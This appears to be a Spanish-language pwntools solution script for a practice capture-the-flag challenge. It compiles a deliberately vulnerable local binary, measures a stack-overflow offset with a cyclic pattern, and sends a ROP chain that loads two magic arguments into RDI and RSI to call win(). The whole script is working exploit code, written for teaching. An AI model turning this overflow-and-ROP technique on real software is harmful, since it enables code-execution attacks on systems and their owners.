#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-02 - "Los dos sellos": win(int, int) exige DOS valores mágicos.
Diagnóstico: No PIE (símbolos fijos), NX, gets(); gadgets EMBEBIDOS
g_pop_rdi/g_pop_rsi/g_ret visibles con ROPgadget.
Razonamiento: convención System V (RDI = 1er argumento, RSI = 2do);
dos trampolines pop cargan los sellos en orden y un ret suelto re-alinea
la pila para el printf de win(). Nada de setarch: No PIE.
USO: python3 sol_ctf02.py"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf02'
FLAG_DEMO = 'FLAG{CTF02_dos_sellos_magicos}'
SELLO_RDI = 0x1337c0de
SELLO_RSI = 0x600dc0de

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'ctf02.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

import os
if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

elf = ELF(BIN, checksec=False)
g_pop_rdi = elf.symbols['g_pop_rdi']
g_pop_rsi = elf.symbols['g_pop_rsi']
g_ret = elf.symbols['g_ret']
win = elf.symbols['win']
log.info('g_pop_rdi = %#x | g_pop_rsi = %#x | g_ret = %#x',
         g_pop_rdi, g_pop_rsi, g_ret)

# ------------------------------------------------------------------
# FASE 1 - offset dinámico: patrón cíclico + corefile (método A2)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'presenta los tuyos')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - cadena de doble sello:
#   [g_pop_rdi][0x1337c0de][g_pop_rsi][0x600dc0de][g_ret][win]
#   Cada pop consume la casilla inmediatamente siguiente: el orden de
#   los sellos es EXACTAMENTE el orden de las casillas.
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'presenta los tuyos')
payload = (b'A' * offset
           + p64(g_pop_rdi)
           + p64(SELLO_RDI)
           + p64(g_pop_rsi)
           + p64(SELLO_RSI)
           + p64(g_ret)          # alineación para printf dentro de win()
           + p64(win))
assert b'\n' not in payload, 'gets() cortaría el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if b'[win] FLAG:' in salida or FLAG_DEMO.encode() in salida:
    flag = salida[salida.find(b'FLAG:'):].split(b'\n')[0]
    log.success('CTF-02 SUPERADO: RDI y RSI cargados en orden System V; '
                'la cámara abrió con ambos sellos (%s).'
                % flag.decode('utf-8', 'replace'))
else:
    log.failure('CTF-02: sin flag. Repasa: orden RDI antes que RSI, '
                'valores exactos, g_ret antes de win() y flag.txt.')
